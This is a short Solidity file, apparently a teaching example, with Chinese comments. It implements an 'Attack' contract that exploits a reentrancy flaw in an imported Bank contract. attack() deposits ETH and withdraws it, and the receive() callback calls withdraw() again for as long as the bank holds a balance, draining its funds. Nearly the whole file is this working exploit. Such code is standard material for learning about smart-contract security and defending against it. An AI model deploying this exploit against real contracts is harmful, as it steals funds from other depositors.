// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Bank.sol";
// 攻击合约
// 基本逻辑： 通过 receive 函数重新调用 Bank 合于的 withdraw 函数
// 从而造成循环调用，循环提款
// 1. receive 函数，接受eth时触发的函数，并且再次调用 Bank 合约的withdraw 函数，循环提款
// 2. attack 函数，攻击函数，在Bank 合约 调用 deposit 存款,然后调用 withdraw  提款，触发漏洞
// 3. getBalance 获取攻击合约的eth 余额
contract Attack {
    Bank bank;
    constructor(Bank _bank)  {
        bank = Bank(_bank);
    }

    // 收款回调函数
    receive() external payable {
        if (bank.getBalance() > 0) {
            bank.withdraw();
            // 再次进行提款
        }
    }

    // attack
    // 先存款
    // 再提款
    function attack() external payable {
        require(msg.value > 0, "need some eth to attack");
        bank.deposit{value : msg.value }();
        bank.withdraw();
    }

    // 获取余额
    function getBalance() external view returns (uint256){
        return address(this).balance;
    }
}
